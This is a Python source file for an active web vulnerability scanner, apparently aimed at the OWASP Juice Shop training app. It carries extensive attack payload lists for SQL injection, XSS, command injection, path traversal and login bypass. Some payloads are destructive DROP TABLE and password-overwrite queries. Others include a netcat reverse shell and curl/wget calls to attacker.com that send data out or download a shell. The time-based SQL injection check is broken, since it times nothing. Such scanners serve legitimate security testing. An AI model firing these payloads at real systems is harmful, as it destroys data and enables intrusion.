import requests
import json
import time
import re
import html
from datetime import datetime
from typing import List, Dict, Optional, Tuple
from urllib.parse import urlparse, urljoin, quote


class VulnerabilityScanner:
    """Мощный активный сканер уязвимостей"""

    def __init__(self, target_url: str):
        self.target_url = target_url.rstrip('/')
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'close',
        })
        self.findings = []
        self.tested_urls = set()
        self.timeout = 10
        self.result_dir = "/tmp/dast_scans"
        self.timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        self.log_file = f"{self.result_dir}/scan_{self.timestamp}.log"
        
        # SQL Injection payloads
        self.sqli_payloads = [
            # Classic SQLi
            ("' OR '1'='1", "OR based injection"),
            ("' OR '1'='1' --", "OR based injection with comment"),
            ("' OR '1'='1' #", "OR based injection with hash comment"),
            ("' OR 1=1--", "OR based injection numeric"),
            ("' OR ''='", "OR based empty string"),
            ("' OR 1=1 #", "OR based with hash"),
            ("admin'--", "Admin bypass"),
            ("' OR username LIKE '%", "LIKE based injection"),
            
            # UNION based
            ("' UNION SELECT NULL--", "UNION NULL injection"),
            ("' UNION SELECT NULL,NULL--", "UNION 2 columns"),
            ("' UNION SELECT NULL,NULL,NULL--", "UNION 3 columns"),
            ("' UNION SELECT NULL,NULL,NULL,NULL--", "UNION 4 columns"),
            ("' UNION SELECT NULL,NULL,NULL,NULL,NULL--", "UNION 5 columns"),
            ("' UNION SELECT 1,2,3,4,5--", "UNION numeric"),
            ("' UNION SELECT 'a','b','c','d','e'--", "UNION strings"),
            
            # Error based
            ("' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--", "MSSQL error based"),
            ("' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--", "MySQL error based"),
            ("' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT version()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--", "MySQL complex"),
            
            # Time based
            ("'; WAITFOR DELAY '0:0:5'--", "MSSQL time based"),
            ("' AND SLEEP(5)--", "MySQL time based"),
            ("' AND PG_SLEEP(5)--", "PostgreSQL time based"),
            ("' AND (SELECT * FROM (SELECT(SLEEP(5)))abc)--", "MySQL complex time"),
            
            # Stacked queries
            ("'; DROP TABLE users--", "DROP TABLE"),
            ("'; INSERT INTO users VALUES('hacker','password')--", "INSERT user"),
            ("'; UPDATE users SET password='hacked'--", "UPDATE password"),
            
            # Boolean based
            ("' AND 1=1--", "AND 1=1"),
            ("' AND 1=2--", "AND 1=2"),
            ("' AND 'a'='a", "AND string equality"),
            ("' AND 'a'='b", "AND string inequality"),
            
            # Second order / Out of band
            ("' AND (SELECT LOAD_FILE('/tmp/test.txt'))--", "File read attempt"),
            ("' AND (SELECT INTO OUTFILE '/tmp/test.txt')--", "File write attempt"),
            
            # NoSQL injection
            ("{$ne: null}", "MongoDB not equal"),
            ("{$gt: null}", "MongoDB greater than"),
            ("{$regex: '.*'}", "MongoDB regex"),
            
            # LDAP injection
            ("*)(&", "LDAP wildcard"),
            (")(&", "LDAP bypass"),
            ("*()|&", "LDAP complex"),
        ]

        # XSS payloads
        self.xss_payloads = [
            # Basic XSS
            ("<script>alert('XSS')</script>", "Basic script"),
            ("<script>alert(document.domain)</script>", "Domain alert"),
            ("<script>alert(document.cookie)</script>", "Cookie steal attempt"),
            ("<img src=x onerror=alert('XSS')>", "Image onerror"),
            ("<svg onload=alert('XSS')>", "SVG onload"),
            ("<body onload=alert('XSS')>", "Body onload"),
            ("<iframe src='javascript:alert(\"XSS\")'>", "Iframe javascript"),
            
            # Event handlers
            ("<div onmouseover=alert('XSS')>hover</div>", "Mouseover"),
            ("<input onfocus=alert('XSS') autofocus>", "Onfocus autofocus"),
            ("<marquee onstart=alert('XSS')>", "Marquee onstart"),
            ("<video><source onerror=alert('XSS')>", "Video onerror"),
            ("<audio src=x onerror=alert('XSS')>", "Audio onerror"),
            
            # Encoding bypass
            ("<scr<script>ipt>alert('XSS')</scr</script>ipt>", "Script in script"),
            ("%3Cscript%3Ealert('XSS')%3C/script%3E", "URL encoded"),
            ("&#60;script&#62;alert('XSS')&#60;/script&#62;", "HTML entity"),
            ("\\u003cscript\\u003ealert('XSS')\\u003c/script\\u003e", "Unicode"),
            
            # DOM XSS
            ("javascript:alert('XSS')", "Javascript protocol"),
            ("data:text/html,<script>alert('XSS')</script>", "Data URI"),
            ("<a href='javascript:alert(\"XSS\")'>click</a>", "Anchor javascript"),
            
            # Filter bypass
            ("<ScRiPt>alert('XSS')</ScRiPt>", "Case variation"),
            ("<script/xss>alert('XSS')</script>", "Attribute bypass"),
            ("<script>alert\\x28'XSS'\\x29</script>", "Hex encoding"),
            ("<script>alert\\u0028'XSS'\\u0029</script>", "Unicode encoding"),
            
            # SVG based
            ("<svg/onload=alert('XSS')>", "SVG no space"),
            ("<svg><script>alert('XSS')</script></svg>", "SVG with script"),
            ("<svg><foreignObject><script>alert('XSS')</script></foreignObject></svg>", "SVG foreignObject"),
            
            # Template injection
            ("{{constructor.constructor('return this')().alert('XSS')}}", "Angular"),
            ("${alert('XSS')}", "Template literal"),
            ("#{alert('XSS')}", "Ruby interpolation"),
        ]

        # Command Injection payloads
        self.cmdi_payloads = [
            ("; id", "Basic command"),
            ("| id", "Pipe command"),
            ("&& id", "AND command"),
            ("|| id", "OR command"),
            ("`id`", "Backtick command"),
            ("$(id)", "Subshell command"),
            ("; whoami", "Whoami"),
            ("| whoami", "Pipe whoami"),
            ("; cat /etc/passwd", "Read passwd"),
            ("| cat /etc/passwd", "Pipe passwd"),
            ("; ls -la", "List files"),
            ("| ls -la", "Pipe ls"),
            ("; pwd", "Print working directory"),
            ("| pwd", "Pipe pwd"),
            ("; uname -a", "System info"),
            ("| uname -a", "Pipe uname"),
            ("; hostname", "Hostname"),
            ("| hostname", "Pipe hostname"),
            ("& ping -c 4 127.0.0.1 &", "Ping localhost"),
            ("| nc -e /bin/sh 127.0.0.1 4444", "Reverse shell attempt"),
            ("; curl http://attacker.com/$(whoami)", "Out of band"),
            ("| wget http://attacker.com/shell.sh", "Download shell"),
        ]

        # Path Traversal payloads
        self.path_traversal_payloads = [
            ("../../../etc/passwd", "Basic traversal"),
            ("....//....//....//etc/passwd", "Double encoding bypass"),
            ("..%2f..%2f..%2fetc/passwd", "URL encoded"),
            ("..\\..\\..\\windows\\win.ini", "Windows traversal"),
            ("..%5c..%5c..%5cwindows\\win.ini", "Windows encoded"),
            ("....\\....\\....\\windows\\win.ini", "Windows double dot"),
            ("/etc/passwd", "Absolute path"),
            ("/etc/shadow", "Shadow file"),
            ("/etc/hosts", "Hosts file"),
            ("C:\\Windows\\System32\\config\\SAM", "Windows SAM"),
            ("C:\\boot.ini", "Windows boot"),
            ("file:///etc/passwd", "File protocol"),
            ("file:///c:/windows/win.ini", "File protocol Windows"),
        ]

        # Auth bypass payloads
        self.auth_bypass_payloads = [
            # SQL injection in login
            ("admin'--", "password", "Admin bypass sqli"),
            ("' OR '1'='1' --", "' OR '1'='1' --", "OR 1=1 bypass"),
            ("admin' OR '1'='1", "anything", "Admin OR bypass"),
            ("' OR 1=1--", "' OR 1=1--", "Numeric OR bypass"),
            ("admin'/*", "password", "Comment bypass"),
            ("admin' #", "password", "Hash comment bypass"),
            
            # NoSQL injection
            ("admin", '{"$ne": "wrong"}', "MongoDB not equal"),
            ("admin", '{"$gt": ""}', "MongoDB greater"),
            
            # Header injection
            ("X-Custom-IP-Authorization: 127.0.0.1", "IP authorization bypass"),
            ("X-Original-URL: /admin", "Original URL bypass"),
            ("X-Rewrite-URL: /admin", "Rewrite URL bypass"),
        ]

        # Sensitive file detection
        self.sensitive_files = [
            "/.git/config",
            "/.git/HEAD",
            "/.env",
            "/.aws/credentials",
            "/config.php",
            "/wp-config.php",
            "/configuration.php",
            "/settings.php",
            "/database.yml",
            "/.htaccess",
            "/web.config",
            "/robots.txt",
            "/sitemap.xml",
            "/admin/",
            "/administrator/",
            "/wp-admin/",
            "/phpmyadmin/",
            "/.DS_Store",
            "/backup.sql",
            "/dump.sql",
            "/database.sql",
        ]

    def log(self, message: str, level: str = "INFO"):
        timestamp = datetime.now().strftime('%H:%M:%S')
        log_msg = f"[{timestamp}] [{level}] {message}"
        print(log_msg)
        try:
            import os
            os.makedirs(self.result_dir, exist_ok=True)
            with open(self.log_file, "a") as f:
                f.write(log_msg + "\n")
        except:
            pass

    def is_valid_url(self, url: str) -> bool:
        try:
            result = urlparse(url)
            return all([result.scheme, result.netloc])
        except:
            return False

    def get_response(self, url: str, method: str = "GET", data: dict = None, headers: dict = None, timeout: int = None) -> Optional[requests.Response]:
        try:
            if timeout is None:
                timeout = self.timeout
            
            if method.upper() == "GET":
                resp = self.session.get(url, headers=headers, timeout=timeout, allow_redirects=True, verify=False)
            elif method.upper() == "POST":
                resp = self.session.post(url, data=data, headers=headers, timeout=timeout, allow_redirects=True, verify=False)
            else:
                return None
            
            return resp
        except requests.exceptions.Timeout:
            return None
        except requests.exceptions.RequestException as e:
            self.log(f"Request error: {e}", "ERROR")
            return None

    def add_finding(self, name: str, severity: str, url: str, payload: str = "", evidence: str = "", description: str = "", remediation: str = ""):
        finding = {
            "template-id": f"custom-{name.lower().replace(' ', '-')}",
            "tool": "custom-scanner",
            "info": {
                "name": name,
                "description": description or f"{name} vulnerability detected",
                "severity": severity,
                "solution": remediation or f"Review and fix the {name} vulnerability",
                "cwe-id": self.get_cwe_for_vuln(name),
                "reference": []
            },
            "url": url,
            "matched-at": url,
            "evidence": evidence[:500] if evidence else "",
            "parameter": payload[:200] if payload else ""
        }
        self.findings.append(finding)
        self.log(f"[{severity.upper()}] {name} found at {url}", "VULN")

    def get_cwe_for_vuln(self, vuln_name: str) -> List[str]:
        cwe_map = {
            "SQL Injection": ["CWE-89"],
            "XSS": ["CWE-79"],
            "Command Injection": ["CWE-78"],
            "Path Traversal": ["CWE-22"],
            "Authentication Bypass": ["CWE-287"],
            "Sensitive File Exposure": ["CWE-200"],
            "Open Redirect": ["CWE-601"],
            "SSRF": ["CWE-918"],
            "XXE": ["CWE-611"],
            "RCE": ["CWE-94"],
        }
        for key, value in cwe_map.items():
            if key.lower() in vuln_name.lower():
                return value
        return ["CWE-Unknown"]

    def detect_sqli(self, url: str, params: dict = None, method: str = "GET") -> bool:
        """Обнаружение SQL Injection"""
        found = False
        
        for payload, payload_name in self.sqli_payloads:
            test_url = url
            test_params = params.copy() if params else {}
            
            # Inject payload into each parameter
            for param in test_params:
                original_value = test_params[param]
                test_params[param] = payload
                
                try:
                    if method == "GET":
                        query_string = "&".join([f"{k}={quote(v)}" for k, v in test_params.items()])
                        test_url = f"{url.split('?')[0]}?{query_string}"
                        resp = self.get_response(test_url)
                    else:
                        resp = self.get_response(url, method="POST", data=test_params)
                    
                    if resp is None:
                        continue
                    
                    response_text = resp.text.lower()
                    response_content = resp.text
                    
                    # SQL Error detection
                    sql_errors = [
                        "sql syntax", "mysql_fetch", "ORA-", "oracle", "microsoft oledb",
                        "odbc", "syntax error", "unclosed quotation mark", "database error",
                        "postgresql", "pg_query", "sqlite", "sqlite3", "hibernate exception",
                        "sqlserver", "mssql", "sql_exception", "invalid query", "you have an error"
                    ]
                    
                    # Time based detection
                    start_time = time.time()
                    if "sleep" in payload.lower() or "waitfor" in payload.lower() or "delay" in payload.lower():
                        elapsed = time.time() - start_time
                        if elapsed >= 4:  # 5 second delay - 1 second tolerance
                            self.add_finding(
                                name="SQL Injection (Time Based)",
                                severity="critical",
                                url=url,
                                payload=payload,
                                evidence=f"Response delayed by {elapsed:.2f} seconds",
                                description=f"SQL Injection detected via time-based technique. Payload: {payload}",
                                remediation="Use parameterized queries or prepared statements. Validate and sanitize all user input."
                            )
                            found = True
                            break
                    
                    # Error based detection
                    for error in sql_errors:
                        if error in response_text:
                            self.add_finding(
                                name="SQL Injection (Error Based)",
                                severity="critical",
                                url=url,
                                payload=payload,
                                evidence=f"SQL error detected: {error}",
                                description=f"SQL Injection detected via error messages. Payload: {payload}",
                                remediation="Use parameterized queries. Disable detailed error messages in production."
                            )
                            found = True
                            break
                    
                    # Boolean based detection
                    if "1=1" in payload or "'1'='1" in payload:
                        resp_true = self.get_response(test_url) if method == "GET" else self.get_response(url, method="POST", data=test_params)
                        test_params[param] = "' AND 1=2--"
                        if method == "GET":
                            query_string = "&".join([f"{k}={quote(v)}" for k, v in test_params.items()])
                            test_url_false = f"{url.split('?')[0]}?{query_string}"
                            resp_false = self.get_response(test_url_false)
                        else:
                            resp_false = self.get_response(url, method="POST", data=test_params)
                        
                        if resp_true and resp_false and len(resp_true.text) != len(resp_false.text):
                            self.add_finding(
                                name="SQL Injection (Boolean Based)",
                                severity="critical",
                                url=url,
                                payload=payload,
                                evidence="Different response lengths for true/false conditions",
                                description=f"Boolean-based SQL Injection detected. Payload: {payload}",
                                remediation="Use parameterized queries. Implement proper input validation."
                            )
                            found = True
                            break
                    
                    if found:
                        break
                        
                except Exception as e:
                    continue
                
                test_params[param] = original_value
            
            if found:
                break
        
        return found

    def detect_xss(self, url: str, params: dict = None, method: str = "GET") -> bool:
        """Обнаружение XSS"""
        found = False
        
        for payload, payload_name in self.xss_payloads:
            test_params = params.copy() if params else {}
            
            for param in test_params:
                original_value = test_params[param]
                test_params[param] = payload
                
                try:
                    if method == "GET":
                        query_string = "&".join([f"{k}={quote(v)}" for k, v in test_params.items()])
                        test_url = f"{url.split('?')[0]}?{query_string}"
                        resp = self.get_response(test_url)
                    else:
                        resp = self.get_response(url, method="POST", data=test_params)
                    
                    if resp is None:
                        continue
                    
                    response_text = resp.text
                    
                    # Check if payload is reflected
                    if payload in response_text or html.unescape(payload) in response_text:
                        # Check if it's executed (not escaped)
                        if "<script>" in response_text.lower() or "onerror=" in response_text.lower() or "onload=" in response_text.lower():
                            self.add_finding(
                                name="Cross-Site Scripting (XSS)",
                                severity="high",
                                url=url,
                                payload=payload,
                                evidence=f"Payload reflected and potentially executable: {payload[:100]}",
                                description=f"XSS vulnerability detected. User input is reflected without proper sanitization.",
                                remediation="Implement proper output encoding. Use Content Security Policy (CSP). Sanitize all user input."
                            )
                            found = True
                            break
                    
                    # DOM XSS detection
                    if "javascript:" in payload or "data:" in payload:
                        if payload in response_text:
                            self.add_finding(
                                name="Potential DOM XSS",
                                severity="high",
                                url=url,
                                payload=payload,
                                evidence=f"JavaScript protocol in response: {payload[:100]}",
                                description=f"Potential DOM-based XSS detected.",
                                remediation="Validate and sanitize URLs. Avoid using innerHTML with user input."
                            )
                            found = True
                            break
                            
                except Exception as e:
                    pass
                
                test_params[param] = original_value
            
            if found:
                break
        
        return found

    def detect_cmdi(self, url: str, params: dict = None, method: str = "GET") -> bool:
        """Обнаружение Command Injection"""
        found = False
        
        for payload, payload_name in self.cmdi_payloads:
            test_params = params.copy() if params else {}
            
            for param in test_params:
                original_value = test_params[param]
                test_params[param] = payload
                
                try:
                    if method == "GET":
                        query_string = "&".join([f"{k}={quote(v)}" for k, v in test_params.items()])
                        test_url = f"{url.split('?')[0]}?{query_string}"
                        resp = self.get_response(test_url)
                    else:
                        resp = self.get_response(url, method="POST", data=test_params)
                    
                    if resp is None:
                        continue
                    
                    response_text = resp.text.lower()
                    
                    # Command output detection
                    cmd_outputs = [
                        "uid=", "gid=", "groups=", "root:", "daemon:",
                        "windows", "boot loader", "version", "kernel"
                    ]
                    
                    for output in cmd_outputs:
                        if output in response_text and ("id" in payload or "whoami" in payload or "uname" in payload):
                            self.add_finding(
                                name="Command Injection",
                                severity="critical",
                                url=url,
                                payload=payload,
                                evidence=f"Command output detected: {output}",
                                description=f"OS Command Injection detected. User input is executed as system commands.",
                                remediation="Never execute system commands with user input. Use allowlists for validation."
                            )
                            found = True
                            break
                    
                    if found:
                        break
                        
                except Exception as e:
                    pass
                
                test_params[param] = original_value
            
            if found:
                break
        
        return found

    def detect_path_traversal(self, url: str, params: dict = None, method: str = "GET") -> bool:
        """Обнаружение Path Traversal"""
        found = False
        
        for payload, payload_name in self.path_traversal_payloads:
            test_params = params.copy() if params else {}
            
            for param in test_params:
                test_params[param] = payload
                
                try:
                    if method == "GET":
                        query_string = "&".join([f"{k}={quote(v)}" for k, v in test_params.items()])
                        test_url = f"{url.split('?')[0]}?{query_string}"
                        resp = self.get_response(test_url)
                    else:
                        resp = self.get_response(url, method="POST", data=test_params)
                    
                    if resp is None:
                        continue
                    
                    response_text = resp.text.lower()
                    
                    # Sensitive file content detection
                    sensitive_patterns = [
                        "root:x:0:0:root:", "daemon:x:", "bin:x:",  # /etc/passwd
                        "[extensions]", "driver32=",  # win.ini
                        "password", "secret", "api_key", "aws_"  # Config files
                    ]
                    
                    for pattern in sensitive_patterns:
                        if pattern in response_text and ("passwd" in payload or "win.ini" in payload or "config" in payload):
                            self.add_finding(
                                name="Path Traversal",
                                severity="high",
                                url=url,
                                payload=payload,
                                evidence=f"Sensitive file content detected",
                                description=f"Path Traversal vulnerability detected. Attacker can read arbitrary files.",
                                remediation="Validate file paths. Use chroot jails. Implement proper access controls."
                            )
                            found = True
                            break
                    
                    if found:
                        break
                        
                except Exception as e:
                    continue
                
                test_params[param] = original_value
            
            if found:
                break
        
        return found

    def detect_auth_bypass(self, login_url: str) -> bool:
        """Обнаружение Authentication Bypass"""
        found = False
        
        # Try to find login form parameters
        test_cases = [
            ("username", "password"),
            ("user", "pass"),
            ("email", "password"),
            ("login", "password"),
        ]
        
        for username_param, password_param in test_cases:
            for payload, password, payload_name in self.auth_bypass_payloads:
                if isinstance(payload, str) and payload.startswith(("X-", "X_")):
                    # Header injection
                    headers = {}
                    header_parts = payload.split(": ")
                    if len(header_parts) == 2:
                        headers[header_parts[0]] = header_parts[1]
                        resp = self.get_response(login_url, method="POST", 
                                                data={username_param: "admin", password_param: "admin"},
                                                headers=headers)
                else:
                    # SQL injection in login
                    data = {username_param: payload, password_param: password}
                    resp = self.get_response(login_url, method="POST", data=data)
                
                if resp is None:
                    continue
                
                # Check for successful bypass indicators
                bypass_indicators = [
                    "welcome", "logged in", "dashboard", "admin",
                    "success", "authenticated", "session", "token"
                ]
                
                response_text = resp.text.lower()
                
                # Check if we got logged in
                for indicator in bypass_indicators:
                    if indicator in response_text and "error" not in response_text and "invalid" not in response_text:
                        # Verify by checking if we're actually authenticated
                        if "logout" in response_text or "dashboard" in response_text:
                            self.add_finding(
                                name="Authentication Bypass",
                                severity="critical",
                                url=login_url,
                                payload=payload,
                                evidence=f"Bypass indicator: {indicator}",
                                description=f"Authentication bypass detected using: {payload_name}",
                                remediation="Use parameterized queries. Implement proper authentication checks."
                            )
                            found = True
                            break
                
                if found:
                    break
            
            if found:
                break
        
        return found

    def detect_sensitive_files(self) -> bool:
        """Обнаружение чувствительных файлов"""
        found = False
        
        for file_path in self.sensitive_files:
            url = f"{self.target_url}{file_path}"
            
            try:
                resp = self.get_response(url)
                
                if resp is None:
                    continue
                
                # Check for successful response with content
                if resp.status_code == 200 and len(resp.text) > 100:
                    response_text = resp.text.lower()
                    
                    # Check for sensitive content
                    sensitive_indicators = [
                        "password", "secret", "api_key", "aws_", "private",
                        "root:x:", "daemon:x:", "[core]", "aws_access_key",
                        "aws_secret", "db_password", "database_url"
                    ]
                    
                    for indicator in sensitive_indicators:
                        if indicator in response_text:
                            self.add_finding(
                                name="Sensitive File Exposure",
                                severity="high",
                                url=url,
                                evidence=f"Sensitive content detected: {indicator}",
                                description=f"Sensitive file exposed: {file_path}",
                                remediation="Remove sensitive files from web root. Implement proper access controls."
                            )
                            found = True
                            break
                    
                    # Git config detection
                    if "[core]" in response_text and "repositoryformatversion" in response_text:
                        self.add_finding(
                            name="Git Repository Exposure",
                            severity="high",
                            url=url,
                            evidence=".git/config exposed",
                            description="Git repository configuration is publicly accessible",
                            remediation="Block access to .git directory. Remove .git from production."
                        )
                        found = True
                    
                    # AWS credentials
                    if "aws_access_key" in response_text or "aws_secret" in response_text:
                        self.add_finding(
                            name="AWS Credentials Exposure",
                            severity="critical",
                            url=url,
                            evidence="AWS credentials detected",
                            description="AWS credentials are publicly exposed",
                            remediation="Remove credentials immediately. Rotate AWS keys. Use IAM roles."
                        )
                        found = True
                        
            except Exception as e:
                continue
        
        return found

    def discover_endpoints(self) -> List[Tuple[str, str, dict]]:
        """Обнаружение endpoints через обход"""
        endpoints = []
        
        # Juice Shop specific endpoints
        juice_endpoints = [
            ("/rest/products/search", "GET", {"q": "test"}),
            ("/rest/products", "GET", {}),
            ("/rest/basket", "GET", {}),
            ("/rest/user/whoami", "GET", {}),
            ("/rest/admin/application-version", "GET", {}),
            ("/rest/admin/application-configuration", "GET", {}),
            ("/api/Products", "GET", {}),
            ("/api/Products/", "GET", {}),
            ("/api/Products/?q=test", "GET", {"q": "test"}),
            ("/api/Users", "GET", {}),
            ("/api/Challenges", "GET", {}),
            ("/api/Vulnerabilities", "GET", {}),
            ("/api/Feedbacks", "GET", {}),
            ("/api/Baskets", "GET", {}),
            ("/api/Recycles", "GET", {}),
            ("/api/Delivery", "GET", {}),
            ("/api/DeliveryMethods", "GET", {}),
            ("/api/Quantitys", "GET", {}),
            ("/api/Cards", "GET", {}),
            ("/api/SecurityQuestions", "GET", {}),
            ("/api/SecurityAnswer", "GET", {}),
            ("/api/Complaints", "GET", {}),
            ("/api/Captcha", "GET", {}),
            ("/api/Login", "POST", {"email": "test@test.com", "password": "test"}),
            ("/api/Authentication", "POST", {"email": "test@test.com", "password": "test"}),
            ("/rest/user/authentication-details", "GET", {}),
            ("/rest/basket/:id", "GET", {}),
            ("/rest/basket/:id/order", "POST", {}),
            ("/fileupload", "POST", {}),
            ("/upload", "POST", {}),
            ("/rest/rewrite", "GET", {"path": "test"}),
            ("/rest/continue-code", "GET", {"continueCode": "test"}),
            ("/rest/continue-code-findIt", "GET", {"continueCode": "test"}),
            ("/rest/continue-code-fixIt", "GET", {"continueCode": "test"}),
            ("/rest/order-history", "GET", {}),
            ("/rest/order-history/orders", "GET", {}),
            ("/rest/order-history/export", "GET", {}),
            ("/api/v2/chatbots", "GET", {}),
            ("/services/{service}/log", "GET", {}),
            ("/rest/memories", "GET", {}),
            ("/api/Address", "GET", {}),
            ("/api/Country", "GET", {}),
            ("/rest/captcha", "GET", {}),
            ("/rest/image-captcha", "GET", {}),
            ("/rest/data-export", "GET", {}),
            ("/rest/privacy-policy", "GET", {}),
            ("/rest/languages", "GET", {}),
            ("/rest/currencies", "GET", {}),
            ("/rest/totp-registration", "GET", {}),
            ("/rest/totp-login", "POST", {}),
            ("/rest/password-reset", "POST", {}),
            ("/rest/change-password", "POST", {}),
            ("/rest/saveLoginIp", "POST", {}),
            ("/rest/2fa/verify", "POST", {}),
            ("/rest/2fa/setup", "POST", {}),
            ("/rest/2fa/disable", "POST", {}),
            ("/rest/2fa/enable", "POST", {}),
        ]
        
        # Common paths to test
        paths = [
            "/", "/login", "/signin", "/auth", "/api", "/api/v1",
            "/search", "/products", "/users", "/admin", "/dashboard",
            "/profile", "/account", "/settings", "/upload", "/file",
            "/download", "/export", "/import", "/report", "/data"
        ]
        
        # Add Juice Shop endpoints first
        for path, method, params in juice_endpoints:
            url = f"{self.target_url}{path}"
            endpoints.append((url, method, params))
        
        # Try each common path
        for path in paths:
            url = f"{self.target_url}{path}"
            
            try:
                resp = self.get_response(url)
                
                if resp and resp.status_code < 500:
                    # Parse URL for parameters
                    parsed = urlparse(url)
                    
                    # Check for query parameters
                    if parsed.query:
                        params = dict(p.split("=") for p in parsed.query.split("&") if "=" in p)
                        endpoints.append((url, "GET", params))
                    else:
                        endpoints.append((url, "GET", {}))
                        
            except:
                continue
        
        return endpoints

    def scan(self) -> List[Dict]:
        """Запуск полного сканирования"""
        self.log("="*60)
        self.log(f"Active Vulnerability Scanner started")
        self.log(f"Target: {self.target_url}")
        self.log("="*60)
        
        # 1. Discover endpoints
        self.log("Discovering endpoints...", "SCAN")
        endpoints = self.discover_endpoints()
        self.log(f"Found {len(endpoints)} endpoints", "SCAN")
        
        # 2. Test for sensitive files
        self.log("Scanning for sensitive files...", "SCAN")
        self.detect_sensitive_files()
        
        # 3. Test each endpoint for vulnerabilities
        for url, method, params in endpoints:
            if url in self.tested_urls:
                continue
            
            self.tested_urls.add(url)
            
            # SQL Injection
            if params:
                self.log(f"Testing SQLi: {url}", "SCAN")
                self.detect_sqli(url, params, method)
                
                # XSS
                self.log(f"Testing XSS: {url}", "SCAN")
                self.detect_xss(url, params, method)
                
                # Command Injection
                self.log(f"Testing CMDi: {url}", "SCAN")
                self.detect_cmdi(url, params, method)
                
                # Path Traversal
                self.log(f"Testing Path Traversal: {url}", "SCAN")
                self.detect_path_traversal(url, params, method)
        
        # 4. Try authentication bypass on login pages
        login_urls = [
            f"{self.target_url}/login",
            f"{self.target_url}/auth",
            f"{self.target_url}/signin",
            f"{self.target_url}/api/auth/login"
        ]
        
        for login_url in login_urls:
            try:
                resp = self.get_response(login_url)
                if resp and resp.status_code < 500:
                    self.log(f"Testing auth bypass: {login_url}", "SCAN")
                    self.detect_auth_bypass(login_url)
            except:
                continue
        
        # Sort by severity
        severity_order = {"critical": 0, "high": 1, "medium": 2, "low": 3, "info": 4}
        self.findings.sort(key=lambda x: severity_order.get(x.get("info", {}).get("severity", "info"), 5))
        
        self.log("="*60)
        self.log(f"Scan completed!")
        self.log(f"Total vulnerabilities: {len(self.findings)}")
        
        # Count by severity
        severity_counts = {"critical": 0, "high": 0, "medium": 0, "low": 0, "info": 0}
        for f in self.findings:
            sev = f.get("info", {}).get("severity", "info")
            if sev in severity_counts:
                severity_counts[sev] += 1
        
        self.log(f"Critical: {severity_counts['critical']}, High: {severity_counts['high']}, Medium: {severity_counts['medium']}, Low: {severity_counts['low']}, Info: {severity_counts['info']}")
        self.log("="*60)
        
        return self.findings
